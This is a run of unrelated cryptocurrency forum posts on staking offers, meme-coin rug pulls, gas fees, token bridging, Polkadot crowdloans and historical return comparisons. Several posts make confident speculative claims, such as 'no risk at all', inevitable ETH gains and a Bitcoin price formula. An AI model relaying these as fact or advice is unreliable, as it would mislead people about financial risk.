I was initially going to go for the 3k staking offer which gives you an additional free netflix/amazon prime account, 3% cashback on purchases and 10%pa staking rewards. But I decided to dip my toes in first and start with the 300 offer. I figured I'd likely make more than 10% on BTC and Eth in a year anyway. But now CRO is rallying and I have no idea if it is going to continue (indeed, no-one knows shit about fuck as the famous r/CC mantra goes).
                    
Am I FOMOing to get more involved now and invest the 3k?
                        
What do you think to the future of CRO as a coin?

That's why I took a break from crypto for a while. I didn't check anything including this sub and markets... I also had a lot to do:

* I passed an important test. (This was partly why I took a break from crypto too)
* I went out of town to see some old friends. (I haven't seen some of them for at least five years)
* I ordered a few parts for my hobby projects. (Yes, I still spend money on normal things in life)
* I played a few games that I missed a lot recently. (Not big of a deal but this made me happy)
* I wrote like 15 letters back and forth to my pen pals. (Yes, -future- billionaires also have pen pals :p)
* I watched Seinfeld -Season 1 (Again, for the 15th time...)

&amp;#x200B;

I just checked the charts, I saw that pretty much everything is in green and up. It just felt like I can do anything. I mean, now I don't follow every millisecond of the markets; I have almost too much time in my hands, literally for anything I want to do...

So, this "Huh. Alright then..." attitude of mine was one of the best things I ever experienced in life ever. I used to feel like I was missing out many things. Crypto made me realize that I'm not actually missing out on anything.

I hope you get what I mean.

 (Thank you all for teaching me about HODLing. I'm grateful.)

So I stumbled upon the "Trending Cryptocurrencies" on CoinMarketCap and oh boy, it does really show that it's a shitcoin season right now. In the Top 10, there wasn't a single solid known or good project, it was all filled with some shit like DogeMoon, Cumstar, LuckyPig, and so on. I am thinking that there is a shitcoin name generator somewhere because some of the names are really getting out of hand lol. 

&amp;#x200B;

I guess you can't be mad for people making a quick buck, however with the rise of these shitcoins, which mostly end up in a rug pull, there are some obvious scams such as the Squid Game Token. This is the reason we need to educate the public about safe investing. Yes, it's cool that coins like DogePepsi and BabyPigToken bring new people to crypto, but they will probably end up hating crypto in general after their favorite CumInu just dumped on them.

I just took out my initial investment and now all the money that is left is house money. So even if my coin go to 0, I would still be fine, so I do have all the upside potential and no downside risk.

Now I can buy whatever coin I want, without worrying that it's going to crash. I did put my entire bank account in during a crash, which was an insane risk I wouldn't recommend anyone else. But I do have income from my job and business, so it was a calculated risk.

But now there is no risk at all, ever. No China ban, bear market, Tether fud, nothing will matter. Now I can just hold and see where it goes.

I did buy 3 pretty high-cap altcoins that are probably going to be around for a while. So any extra profit I can make is always cool.

Have you already taken out your initial investment? It feels awesome, doesn't it? :)

Im trying to transfer money between bank accounts and the bank goes: 

*Oh, well, well transfer this for you if you get it in before 11am, then it will take 2-3 days to process. If you dont get it in before 11am, well then itll take 3-5 days processing. And dont even think about asking us to do anything for you on the weekend!* 

What the HECK. This is MY money, I worked for it, I allowed the bank to hold it for me purely for convenience and safety. Now theyre playing games with me about how quickly I can access it?? What if my grandmother died and I needed that money ASAP?? Money transfers are as far as Im aware, done by computers. How long can it take!? 

On top of that, sending money to my crypto exchange my bank freaks out. Blocks the transaction. I get a phone call warning me that crypto is a scam and so on. I tell them never to bother me again about this exchange, I authorise the payments. So now, whenever I transfer the bank puts a 24 hour security hold on the funds. EVERY. STINKING. TIME.

You know I was scammed once, some person in another country was using my card to make transactions. Do you think the bank flagged those? Mysterious transactions from a different country? Nope! I had to call them! Theyll protect me from crypto but not obvious fraud. 

Now, my crypto exchange. If I transfer coins alls it asks is make sure you double check the address! And away we go. Funds transferred in 3-20minutes depending how far Im sending them. No arguments. No phone calls. No stuffing me around with money I earned. I really believe in crypto because of this and so many other things. But right now Im just mad as heck at my bank for disallowing me to spend my money where I want. 

Trade safely :)

I bought Floki Inu about a week ago and I want to be prepared to cash out in the event it goes to the moon or begins to crash. I previously had only bought crypto through coinbase and that is fairly simple to transfer between coins. With Floki Inu I had to purchase BNB on [Crypto.com](https://Crypto.com) send it to trust wallet then use pancake swap to get the Floki. Currently I have the Floki in my trust wallet. So what would be the cheapest (least amount of fees) way to get my Floki in trust wallet to bitcoin in coinbase when I decide I want to sell?

Couldn't find this answer anywhere because the only information revolves around buying it.

I have been under heavy depression for the last 2 years. Root cause was I never felt I had any control over my life(according to my psy) and in my own head I am not good enough for anything. All my friends were making way more money that I do and it killed me from inside. I thought about changing jobs several times but I always had this fear what if I loose my current one and become jobless. 3 months back I started investing and made nice profits with whatever money I had. After such a long time I have this feeling of winning. It is so weird I can't explain. Also gathered up enough courage to finaly change my job and today I got an offer letter. Investing in crypto seemed like such a small step but it gave me enough courage to follow through with my ideas without worrying too much. I would like to thank this community for all the insigts I got from random posts. You guys kick ass

Today CRO reached a new record of **0.28** which fully demonstrates the growth of the crytpo.com chain.  
It began to attract attention to many months ago after an intense marketing campaign by crytpo.com, offering everything from a DeFi wallet to a card service where they return a% in CRO.  
All this and much more raised the success of CRO that lately is more famous than ever.

What is it?

Crypto.com Coin (CRO) is the native cryptocurrency token of Crypto.com Chain  a decentralized, open-source [blockchain](https://coinmarketcap.com/alexandria/glossary/blockchain) developed by the Crypto.com payment, trading and financial services company.

Crypto.com Chain is one of the products in Crypto.coms lineup of solutions designed to accelerate the global adoption of cryptocurrencies as a means of increasing personal control over money, safeguarding user data and protecting users identities. The CRO blockchain serves primarily as a vehicle that powers the Crypto.com Pay mobile payments app.

People often struggle to put a price on Bitcoin long term, or have trouble understanding what different price estimates would mean for the coin. 

So here is a simple but useful calculation to use when estimating a long term price:

*For every 5% of the entire worlds wealth that you think will end up stored in Bitcoin, give Bitcoins price $1,000,000.*

If you think Bitcoin will capture 10% of the worlds wealth long term - that will equal $2,000,000 per Bitcoin.

Think that number could be 20%? Then we are looking at a price of $4,000,000.

What percentage do you think we will be at by 2040??

$0.27699 was touched a short while ago and the charts and outlook are looking super bullish.

Yes, we know the Matt Damon effect helped, but not as much as being listed on Coinbase, etc. Still a LOt to look forward to: next Monday sees the launch of Cronos and the new CRO Dexes, etc. 

I've posted before about how bullish I am on this coin, but yesterday's news about Crypto.com's partnership with Twitch Rivals was yet another PR/Advertising masterstroke.

Here's hoping that the Coinbase listing will be followed by Binance and other exchanges... and that the price of CRO steadily climbs to $1 and beyond in the next few months.

Given all the right moves by [Crypto.com](https://Crypto.com) and their marketing blitz, I think it's fair to say that CRO is likely to become the next BNB ... hopfully aiming for $3/$4+

Still so much to look forward to!

Seriously what is wrong with people? really don't get this, why would you keep buying a coin that 1st: was a rug pull and 2nd: you can't sell it. Do you hate money or something?  

I now 100% agree with the user saying that if you got scammed with squid you deserved it, if all it takes to scam you is making  a coin with the name of something popular then crypto is definitely not for you 

Wait till someone makes a squid game season 2 crypto or something and see the cycle repeat itself. I know i shouldn't be upset about this but man...

Rugpulls, fake liquidity locking and other ways to scam you are very common in new meme coins nowadays. Almost all new tokens are meme coin judging from new listed coins on Coinmarketcap / CoinGecko. I'm just trying to warn newbies who believed that they can still make insane profits from meme coins. I'm not saying it's impossible I'm just saying we have many fake meme coins out there now, they are just copying Shiba Inu and few others. Always DYOR.

*Personal story.* 

I have a solid portfolio of ETH, BTC, MATIC, SOL, etc. Also, I have some funds (5-10% of the entire portfolio) that I can loose and never regret about it. I decided to invest in several meme coin (some of them are not even listed on CMC and other listing platforms). I thought I could make x10-x100 and leave it. I'm a dumb fck. 

**1**. I invested in Batman coin. I was not scam, it's just simply almost dead, lost $100.
**2**. ShibKiller. Lost $100
**3**. SpaceXSHib. Rugpulled, lost every single dollar I invested. -$200
**4**. FlokiClown. Everything was pretty good at the beginning. Then there was no marketing and almost dead community. Lost $300.
**5**. InuViking. Rugpulled, lost all my coins, - $150.

Always DYOR and don't be as dumb as I am.

We have an investment channel in our company's Slack, where I noticed that several people point out some investment opportunities. I did not know that the general consensus in the company is that crypto is "worthless internet money", so I wrote in May that anyone looking for a cryptocurrency investments might have a good opportunity now that it receded to lower levels. (At the point of writing this, had they invested, they would have more than doubled their money)

&amp;#x200B;

So the company is relatively small and the CEO went batshit crazy on me that "crypto is gambling", "I am literally wasting my salary", "magic internet money costs $60 per transaction", etc.

&amp;#x200B;

Just yesterday, in another channel, someone was talking about some blockchain advertisements, and the CEO opened with recent rug-pulls and the classic crypto is bad, there is not a single good project in crypto, etc. finishing with a statement that they will have a company-wide off-topic presentation on 'sane investment strategies' and tagged me with words "you might be interested in this".

&amp;#x200B;

For clarity, this person invests with a small broker, because they 'like the reliable, friendly approach', with fees for transaction of $100+ if it is a global stock, $10 if it is from the local market.

&amp;#x200B;

There are many 'strong' opinions of this person, which are usually just the opposite of the mainstream, I guess some people really need that opposition feeling.  


A little ranty, sorry.

So Ive been consistently buying a pretty even mix of BTC, ADA, and Eth. However Im loving Eth right now more than the other two. Ive also looked into and bought a little SOL. 
But whats next? Should I keep buying an even mix of those 4 or is there any other solid coins I should be looking at? I know Im a little late to SOL to start buying but is there a future there? Not looking for any crappy alt coins. Its hard to tell nowadays which coins are actually worth something and my buddies are all buying alts like shiba and doge but Im not sure those are going to be around in 5-10 years. Im not looking to make a quick buck.

Ive been using the locked staking products for as long as Ive been a Binance user. Mostly MATIC, SOL, ADA. 30-90 day terms here and there. 

Recently Ive been trying out some 5x-7x Cross ETHUSD Perpetual Futures positions and decent returns are pretty consistent using the various types of orders supported by Futures. 

Obviously greater risk and greater reward potential with Futures VS Staking, so Ive been thinking of no longer staking my SOL and instead opening a Futures position as well. 

Am I fucking nuts here? Why wouldnt everyone do this? As long as I keep a level head and dont go bonkers with the leverage larger returns faster without locking the funds wheres the downside? 

I feel like Im missing something.

Okay so this is my question.

If you woke up to your crypto balance at $2 million, what would you?

1) Sell it for fiat, pay 50% tax and invest $1m in property (around $50,000/year income)

2) Diversify in crypto interest accounts like BlockFi, Gemini and others (to reduce risk) - this will let you only pay tax on the amount you withdraw
(7% interest would be $140,000/year).

Or would you do anything else?

Can we please use the example that your living expenses are around $1500/month and that youd wanted to relax and not take huge risks.

Also, would you think about getting a nice car?

Would love to see how everyone else thinks.

PS - Im broke, no I dont have $2m lol Im just wondering what would everyone elses go-to plan would be.

Thank you so much! Would appreciate any answers

Hi guys :)

I've made a video of one of the most important things to understand in DEFI, Dexes, and crypto in general, **Liquidity!**

[**https://www.youtube.com/watch?v=\_vsg8P9Gq-0**](https://www.youtube.com/watch?v=_vsg8P9Gq-0)

Liquidity is one of the most important things in decentralized exchanges and without it, the DEX's actually doesn't worth anything.

The more liquidity decentralized exchanges have, the better prices the users are going to pay when swapping tokens and they will suffer less from price impact and slippage.

That's why most of the decentralized exchanges are "fighting" for liquidity by offering Yield Farm and Staking programs.

Basically, the war is between blockchains and decentralized exchanges, the one with the most amount of liquidity wins.

Imagine a decentralized exchange like a robot that holds tokens in pairs (for example Cake-BNB).

The robot in our story is a smart contract that it's is to preserve the same amount of BNB and Cake in the reserves.

Anytime someone is buying or selling cake to the contract (robot) he changes the balance and therefore the contract is giving the user a "worse price" for the swap (Slippage).

The bigger the swap, the bigger the slippage is gonna be. The more liquidity the "robot" has, the lower the slippage will be.

In this video, I am going to explain to you all these kinds of concepts in an easy way, so after watching the video you will finally understand what does liquidity means on decentralized exchanges and why it's so important.

Hope you like it, and lemme know if you have any questions.

Johnny.

So I bought some USDC in an exchange and transferred it to Metamask on ETH mainnet. My original plan was to lend through Aave or Compound, but authorizing that transaction would cost around $150 in gas, which is obviously not ideal. 

I realize I screwed up buying the ETH mainnet version of the token and I should've done more research, but that ship has sailed and the lesson has been learned. 

The way I see it I have a number of choices:

1. Leave the USDC where it is until gas fees become reasonable. I don't have an immediate need to access those funds, but for all I know gas might never be reasonable again. 
2. Bite the bullet now and authorize Aave/Compound with the high gas, although who knows what gas is going to be like when I need to withdraw
3. Get the USDC out of ETH mainnet into a L2 or side chain (i.e. bite the bullet now, but at least be in a lower gas environment going forward)

Assuming 3 above is the way to go, which L2 solution or side chain would you recommend? Are bridging costs similar among options? What about gas costs going forward? I'm fairly new to L2/sidechains so any help would be appreciated. TIA.

Could be a stupid question, but realistically, Im hesitant to move my Eth now because of high gas fees. Id much rather wait until Eth 2.0 happens. Especially in regards to my ERC-20 tokens that I want to get rid of but have high gas fees that make it not worth the trade due to tax implications and fees. 



I will now take this moment to confess my love for crypto: Oh crypto! My love! Youre as warm as the sun and as nourishing as the autumn flowers. You bring me great joy when youre green, and excitement when youre red. I just wish the 500 character count was dead!

Hello, 

i am relatively new in crypto and just try out everything i can find. While doing so i navigated myself into a situation i dont know to escape:

I wanted to buy a NFT and transferred money to my "Torus"-Wallet in form of USDC via Moonpay. (Torus was recommended in the NFT sale) I wasnt able to buy the NFT but now my USDC is on my Torus wallet and i dont know how to get it back. The USDC is on the Polygon Network as it seems and one "test-attempt" to send a small amount  to my Kraken USDC Deposit Address failed. 

As far as i understand Kraken only works for ERC20 USDC while my USDC is on polygon network. (is this correct? sorry i tried to understand polygon but its very complicated at my current level of knowledge) I have read that i have to somehow "bridge" the USDC to ERC20.

The final goal is to have the Polygon USDC in some bigger exchange where i can use it to buy other crypto, preferred kraken. 

Can somebody help me to achieve this? 

Can somebody explain to me why there are two different "Matic" Polygon/ERC20?

So this coin was released less than 48 hours ago. It has a huge APY and a super low market cap. price is naturally moving quickly with a 2 million dollar market cap but was wondering if anyone sees long-term potential in this? At the moment if you put 10K in it would yield about $250 every five days based on the reflections from the APY. Anyways, let me know what you think and if it is worth an investment.

&amp;#x200B;

It's also very difficult to buy at the moment. You have to do a bunch of steps, sned dai to metamask, bridge dai to fantom, swap to Hec and then stake. The APY alone is very enticing to me but this seems like a replica of Klima. So I am Wondering if this may see the same gains as Klima Dao. I guess another question to ask is what the potential for Dao's in general might be in the long run, They sort of seem too good to be true in my opinion, I am still looking for the catch..

Hello everyone, first time posting on the sub!

As someone still new to the crypto space overall (took the plunge last May), there's one thing I've been passionate about since learning about them: the upcoming [Polkadot Parachain Slot Auctions](https://polkadot.network/auctions/). The first round is officially debuting on November 11th. I'd say the *active* aspect of these auctions is what's got me hooked, because it feels to me like I'm not just holding a particular coin/token waiting for its value to rise (not that there's anything wrong with that!).

I've been reading left and right about the overall participation process as a simple plebian, and I've subscribed to a couple newsletter (which I never do) to make sure I stay in the know for the upcoming weeks. One thing I've learned is that **you can already participate in the first round right now**, as an *early bird* participant and obtain greater rewards for doing so.

Thing is, **my DOT is currently unbonding** and should be available somewhere on November 10th, which gives me **less than a single day** to spread my DOT across my favorite projects crowdloans and get that sweet bonus.

And so this brings me to this post, which will act as my personal notes to ensure I am ready to participate on the 10th. Also wanted to share everything that I'd record too, in case it could benefit anyone else on this sub. You peeps deserve it.

# How I heard about the auctions

**First up is Coin Bureau's** [**Polkadot Projects That Are HOT! My TOP 3**](https://www.youtube.com/watch?v=KzqLf7Kteuk) **video**

This got auto-played when I had YouTube open while prepping dinner. Even though the video is kinda old (March), make sure to at least watch the initial explanation of the Polkadot ecosystem which goes up to about 6:45 for a great introduction to the ecosystem. There's also the *Common Good Parachains* part at the end (17:40) that you should take a look at.

I'm not trying to shill the projects presented in this video either, but they are names you'll encounter sooner than later if you're reading up on the auctions. Might as well learn what they are if you're hungry for knowledge. Note that the information presented might be out of date, so here are links to the projects in case you'd want to double check information:

* [Acala](https://acala.network/)
* [Phala](https://phala.network/en/)
* [Litentry](https://www.litentry.com/)

**Third is the Litentry newsletter**

Since the video above was what introduced me to the subject, I decided to check out the projects and ended up subscribing to Litentry's newsletter. [Got an update this morning](https://litentry.medium.com/litentry-crowdloan-welcomes-our-new-partner-parallel-to-provide-contributors-liquidity-cdot-and-eb816ec535c6), which introduced me to [Parallel Finance](https://parallel.fi/) (more info down below). Someone on this sub suggested the platform, but I did not take a moment to check it out at that time.

You can learn more about Litentry's crowdloan event here: [Litentry Crowdloan Event  The Web3 Identity Hub on Polkadot](https://crowdloan.litentry.com/).

**Second is James Agenda's** [**holdpolkadot.com**](https://www.holdpolkadot.com/) **blog**

Now I'm not usually a fan of blogs, but with the situation at hand I just want to have quick access to information regardless of its origin (as long as it is legit). Mr. Agenda has been posting some of his articles on the sub, from which I learned a lot. Here are 3 articles that I bookmarked:

* [Parachains Crowdloans: 3 Best Ways on how to participate in Crowdloans for Polkadot Auctions](https://www.holdpolkadot.com/post/3-best-ways-on-how-to-participate-in-parachains-auctions-on-polkadot-via-crowdloans)
* [How to prepare Polkadot.JS for Crowdloans in Parachain Auctions (Step-By-Step Tutorial)](https://www.holdpolkadot.com/post/how-to-prepare-polkadot-js-for-crowdloans-in-parachain-auctions-step-by-step-tutorial)
* [ACALA Crowdloan: Easy Step-by-Step guide on how to contribute to Parachain Auction](https://www.holdpolkadot.com/post/acala-crowdloan-step-to-step-guide-to-participating-in-parachain-auction)
* [Crowdloans: My Strategy on the Best Projects for Parachains Auctions on Polkadot](https://www.holdpolkadot.com/post/crowdloans-my-strategy-on-the-best-projects-for-parachains-auctions-on-polkadot)

# How I plan to participate via Parallel Finance

At first I was thinking of using the official [https://polkadot.js.org/](https://polkadot.js.org/) platform, just to manage my participation from a single place. But then I heard and read about [Parallel Finance](https://parallel.fi/). Looked simple and clean, so I tried to emulate my participation to a project and see how it goes. Here's what I did.

**Set up the Polkadot{.js} browser extension**

1. Installed and enabled the [Polkadot{.js} extension](https://polkadot.js.org/extension/) on my browser (if you're a fellow Brave user, simply install the Chrome version)
2. Added my wallet to the extension (you can create one if you don't have any).
3. Made sure I have DOT available for transfer in your wallet. By that I mean you see a **transferrable** DOT balance in your wallet account on [https://polkadot.js.org/apps/#/accounts](https://polkadot.js.org/apps/#/accounts) (*locked, bonded* or ***unbonding*** will not do \*cries\*)

If you need more information regarding these 3 steps, refer to [this blog post](https://www.holdpolkadot.com/post/how-to-prepare-polkadot-js-for-crowdloans-in-parachain-auctions-step-by-step-tutorial).

**Connected my wallet to the Parallel Finance App**

1. Visited the [Parallel Finance Polkadot Crowdloan App](https://crowdloan.parallel.fi/#/auction/polkadot)
2. Connected my wallet using the *Connect to Wallet* button up top
3. This prompted me to authorize the site to the Polkadot{.js} extension
4. Clicked *Yes, allow this application access*

Now I was able to contribute to the crowdloan for the projects listed on Parallel Finance (even though I have no available balance at the moment). Here is the current list (at time of writing) if you want to save a click, or learn more about individual projects:

* [Acala](https://acala.network/)
* [Astar](https://astar.network/)

# Conclusion and future edits

Hope I didn't break any rules with the amount of links I put in there. The expanded post rules are scary, so I feel safer not trying to link posts or user profiles. There are tons of posts/comments/people on this sub that I would like to credit. Many thanks to all of you who have posted about the auctions and sorry I couldn't credit you all.

I'll be happy if this helps only one of y'all.

Hi guys,  


I know many of these mayors recently have been saying so many pro btc statements, someone making NYC a BTC city hub, the other saying he will receive his salary in BTC. I don't know why but it just seems like they are just saying all that to get the PR attention and to get votes.  


Remember just a while ago.. BTC was apparently so dangerous according to them and  used to do illegal things... so now suddenly when the world public is crazy on the crypto hype train, i have a feeling they are just using this to get the votes and popularity.   


Again, these are just my thoughts..I hope I am proven 100% incorrect them

I'm 40, and I've dabbled in crypto starting around the time BTC was at 20k before the massive crash.  Got convinced to get into it...seemed like a gold rush at the time. I remember setting up an account on hashflare and ultimately finding out if BTC's price dropped below a certain $, they voided your account lol.  Had a bunch of alts and some eth, but that was about it.  Fell out of following crypto for a while when the crash happened and recently jumped back in a few months ago.  I've tried to explain to some family about it...but it's too over their head and even with crypto being more maintstream these days, I still get the impression they view it as a fad.  Some friends and I talk about crypto, but that is about it.  

I feel like the people who are here that are in the 18-30 bracket likely have much better interactions with family and friends about the topic than someone older.....but I was just curious.

Let's say you had the time, the knowledge and the money to create your own crypto project (coin or token).

What would you create? Just another random meme coin or something that actually does something new or better?

Some ideas for telling us about your dream project)

- What would your coin/token stand for? 
- How would you build your tokenomics?
- What would be your main goals?
- How would you try to achieve those goals?
- What do you think are the major reasons that your coin does not already exist (meaning that nobody else did it yet)?
- Who would be your major competitors (in crypto or outisde of it)?
- What is your major risk and consern about it?
- etc.

Mine would be a token/coin which allows everyone to tokenize all kind of things. You may create a token for an expensive collectible you have so you can sell parts of it to investors, you may do it for your house, your company, or whatever.

There would be an underlaying coin which is there for the infrastructure and as a ground layer for all tokens created on it which are linked to actual values.
 
I would add a swap, exchange to people can buy other peoples tokens etc.

I got into crypto last year &amp; I made tons of profits with eth &amp; cardano. However, I lost tons of profits from panic selling &amp; becoming impatient. If you are here for the long term &amp; you believe your coins has utility, is unique &amp; and has a future in crypto just know:

Your coin will be pump and dumps to some people.

Meme &amp; other hype coins will steal the spotlight 

It will see bear markets.

It will see tons of volatility. 

But if you hold. Your coin will eventually prosper &amp; you will be able to reap the rewards.

So like the title says, I am looking for a place to buy newer coins before they get pretty popular. So like how would have I got ahold of Shiba before it landed on coinbase. Im guessing these sites are a bit more sketchy then coinbase. Not trying to spend anything crazy and go all in on some shit coins, I just figure if I'm going to buy a 20 dollar lottery ticket I might as well spend that on a better chance to make more. Also if you got some suggestions on some shit coins (that I won't look up at all but will buy if I like the name or the pic) I'd be happy to hear em. As always thanks for the advice.

Bitcoin is the king. Bitcoin has the brand recognition and the market cap that sets the tone for what the crypto space is. But that doesn't necessarily mean it's the best coin out there and it doesn't mean countries should be selecting it as their first major crypto adoption. If you don't believe that bitcoin is the best cryptocurrency that these countries should have adopted first as legal tender, what would you have recommended as the first legal crypto and why? Would the rollout in El Salvador have been better with your chosen coin?

I'm curious what everyone here thinks of GMR. It's about to go through a migration because the orginal token had the contracts renounced. And when it does so the token amount will be slashed. Holders will have it divided by 1 million. The community seems very solid and the utility of the token makes sense. They are even running contests to give out tokens from the developers wallets to increase the number of holders before the migration. But I never see anyone outside of the community ever talk about it. I see news articles talking about all these other cryptos but not one have I seen anything about GMR. As crypto aficionados what does everyone here think of it?

XRP is like marmite, people love it and people hate it. But the one thing we can agree on is that XRP got shafted by the SEC.

Now regardless of that, XRP has tentatively participated in this bull run so far and may have a significant amount more to come.

I believe that it does due to the following:

1) Payment volume on the XRPL growing all year to now do in excess of $1bn per day in volume;
2) Huge growth in the XRP ecosystem from developers with lots new projects on the XRPL;
3) Growing use of the integrated XRPL DEX;
4) Huge transaction volumes on Kraken in the past few months directly into EUR and CAD. Check XRPcharts.ripple.com.
5) Many direct FIAT pairs on global exchanges rather than just stable coins; and
6) Impressive growth of the ODL volume this year with new partners every month.

A lot of this has gone under the radar and could see a decent end to this bull run for XRP regardless of the SEC.

Hello.

I am fairly new to cryptocurrency. I've been researching and studying everything I need to know before fully entering the world of crypto. I've also been keeping an eye on the value of ETH and BTC. ETH was a few hundred euros in September and now I checked, it was over 3000. Not to mention BTC, I'm sure everyone knows the value today. And I also discovered the term 'bull run'...

My question is, should I wait for it to be over or should I just go ahead and buy, even if it's a small amount? What do you think, how long the bull run lasts?

All of your thoughts and tips on this topic are greatly appreciated!

I sincerely hope this post doesn't break any of the rules. It is my first time posting on Reddit.

Thank you in advance

So I was OK with the $40 fee to purchase the Ethereum through Trust wallet. But now its wanting to charge me like $140 or 150 to trade Ethereum for the crypto I want. I did not put a lot of money into Ethereum so basically it wants near half. Am I just stuck with Ethereum on trust wallet now? I cant even send it to another exchange because it will charge me outrageous gas fees that way too? I dont know why I didnt think it would charge me some crazy gas fee but its just absolute bonkers and now my money is just kind of floating in trust wallet at Ethereum all time high

**tl;dr**

* Diversification in Crypto seems to be an alright concept: On average investing in the top 101-200 Marketcap coins returned more profit than just just doing the top 20 coins or even the top 100, or even all in on BitCoin.
* Your investment can only go to 0% at the worst, while the gains are uncapped. 
* Investing during a bear market is damn pretty lucrative regardless of the method you use.
* Ethereum alone is pretty damn good too.
 

Tiny bit of backstory and what the inspiration for this research was, I saw an article called [Here's How Much You'd Have if You Invested $1,000 in the Biggest Cryptos 3 Years Ago](https://www.fool.com/the-ascent/cryptocurrency/articles/heres-how-much-youd-have-if-you-invested-1000-in-the-biggest-cryptos-3-years-ago/) from The Motley Fool (sorry).   **The TL;DR of the article was If you put $100 apiece in those 10 cryptos three years ago, your $1,000 investment would now be worth $7,134.93 -- an increase of 613%.**  Youll also see that a **couple of coins were doing most of the heavy lifting,** while others returned negative amounts.  This got me thinking about mapping this out for other coins and other time-frames.

**Methodology**



Coinmarketcap has historical price data so it was easy enough to scrape that into a spreadsheet and get to work with some fancy formula work. https://coinmarketcap.com/historical/  I also did my best to remove stablecoins and wrapped tokens.  Keep in mind this is if you spread *equal* amounts throughout the amount of crypto noted.  I tried to pick peak bear and bull markets as start dates.  Ive also noted the market conditions.  The end date is relatively arbitrary other than that were in a bull run right now and its the most recent data we have available.  Here is what I measured, against the end date (10/31/21) and marketcap ranking at the time of the Start Dates.

* Top 20 Only
* Top 100 Only
* Top 101-200 Only
* Top 200

**Results**

Enough blabbing, let me present the data.  The percentages are RETURN percentages.  (Negative numbers indicate a negative return, positive numbers indicate a positive return)


Start Date|End Date|Top 20 %|Top 100%|Top 101-200 %|Top 200 %| Market Conditions
:--|:--|:--|:--|:--|:--|:--
12/17/17|10/31/21|37.80%|287.04%|72.01%|226.75%|Peak Bull Market 2017
5/27/18|10/31/21|369.23%|160.05%|463.09%|265.66%|Heavy Bear Market 2018
12/27/20|10/31/21|323.31%|597.06%|845.98%|725.76%|Bull Run Start 2020
3/28/21|10/31/21|54.30%|51.51%|5.93%|28.46%|Peak Bull Market Q1 2021 (BTC)
5/9/21| 10/31/21|-11.45%|-9.48%|-11.89%|-10.86%| Peak Bull Run (DogeCoin) 2021
6/13/21| 10/31/21| 40.08%|77.28%|58.10%|68.07%|Peak Bear Market 2021



Smoothing that all out for an average:


Average Top 20 % |Top 100 Average % | Top 101-200 Average % |Top 200 Average %
:--|:--|:--|:--
135.54%|193.91%|238.87%|217.31%


And, of course, we have to compare these vs the King and Queen of crypto.  First, the same for BTC and ETH:


Start Date | End Date| BTC Price | ETH Price | BTC % Return | ETH % Return
:--|:--|:--|:--|:--|:--
12/17/17|10/31/21| $19,140.76 |$719.98 | 220.36% |495.58% 
5/27/18 | 10/31/21| $7,368.22| $572.67| 732.21%| 648.79%
12/27/20 | 10/31/21| $26,272.29|$682.64| 133.40%| 528.16%
3/28/21|10/31/21|$55,950.75|$1,691.36|9.59%|153.53%
5/9/21| 10/31/21|$58,232.32|$3,928.84|5.30%|9.14%
6/13/21| 10/31/21|$39,097.86| $2,508.39 |56.83% |70.95%


And now the Average Smoothing:


Average BTC Return | Average ETH Return
:--|:--| 
192.95%|317.69%



For those interested in the raw data, check the tabs at the bottom of the sheet [here.](https://docs.google.com/spreadsheets/d/1WFtyf9m166Xne_oRxEyVSWZ4m6uAO6ZqdK5O2eUpapE/edit#gid=0)


**Conclusions:**

* On average investing in the top 101-200 Marketcap coins returned more profit than just just doing the top 20 or even the top 100, or even all in on BitCoin.
* Diversification appears to not be a terrible idea.  Some coins went to almost nothing, but then we also had some that went 3000%+, which makes up for a hell of a lot that went to 0.    Interesting, yes?
* Bear market investing is a great way to make ridiculous returns.
* Maybe burying the lede here, but Ethereum kicked all of them in the taint.

**Limitations**

* Need more data points for comparison.
* Past performance is not a guarantee of future performance.
* This is not financial advice.  
* Entirely possible that different data sets provided better returns (e.g. Coins 301-400 might have returned more but I didnt test for that).
* Almost certainly missed some Stable and Wrapped coins in the stats.  It shouldnt matter *too much* on the end numbers.
* Fees and such on moving all that stuff around eventually might eat up the gains (?)
* I have no recommendation on Exit Points.  Perhaps you might.
* In 2017 the Alt Market was seemingly not as robust or lucrative or stable as it is now.  It might be helpful to throw that entire datapoint out since the markets are more mature now.
* Probably tons of stuff that I didnt do that I will learn about from your comments :)
* Bitconnnnneeeeeeeeeeeect

 Whenever it is, really. I know we dont want to hear about it in this part of the bull run, sorry.

You can hear the news that they are buying the dip and build twenty schools from the profits. Everything is seemingly going great right now (not just for them, but for most of us) but the bull run will be over at some point.

What then? Are they preparing for this inevitable day or they just yolo'd in? I guess them taking profits for building schools is good for starters. Is it enough though? Wonder if El Salvadorian people got proper education on the cyclic nature of the crypto market.

 After the recent rally in the price of ETH, the market cap has climbed to an extraordinary $543 billion. With the market cap of BTC currently sitting at $1.193 Trillion, ETH has a MC equivalent to 44.76% of BTC.

If the current sustained growth continues as ETH moves forward as a deflationary coin, there is a very good chance that it will pass the symbolic 50% mark, depending on how hard BTC pumps between now and EOY.

Either way, that 50% is inevitable and it's at that point that the FOMO will kick in and push ETH to even greater heights - towards $15K.

The idea of Ethereum having a market cap of 50% the market cap of BTC seemed a long way away just a year ago, but if the current rate of growth continues for both ETH and BTC, it's likely they will achieve parity before 2030. Possibly even a lot sooner than 2030.

For everyone holding ETH, rejoice. Every single one of you will eventually be rich as fuck.

Guys let nobody fool you on this crypto investment. The fundamental rules of these things remain the same. Nothing has changed. People has been saying it here on this platform and some times we don't listen. Please the fundamental rules are still effective.

1. DO your research properly for any crypto you want to invest in.
2. HODL, HODL HODL no matter what.
3. LONG TERM INVESTMENT PAYS OFF.

A $500 investment on BNB exactly a year ago now worths over $10,600.
A $500 investment on Solana at same time worth over $85,600.
A $500 investment on LUNA at same time worth over $117,000.

Same can be said of AXS (x300), FCN (x200) and so many others. GO FOR LONG TERM!

I have decided to do this no matter the market movement. Bull or Bear. I will invest and hodl on quality projects.

So I posted about using blockchain tech in the classroom to help classroom rewards. A non-tradeable token for kids to cash in and get prizes. Which is a standard method used in classroom today, just using things like tickets etc. I am just making it exciting and more up to date. Also I created my own token, thats untradeable, isnt on an exchange and we dont even have "wallets" just a point tally using the token.

Here are some of the responses: https://imgur.com/a/9DNDGh3

You think a programming subreddit would be more open-minded and understanding about groundbreaking technology. I have to say im just embarrassed for them.

Even more embarrassing as millions of institutional dollars flow into crypto these people insist the underlying tech is gambling. Some coins are, but they are missing the ENTIRE point of my post, I was talking about using blockchain, and had a programming question. Are programmers blind to web3?

Were so early guys.

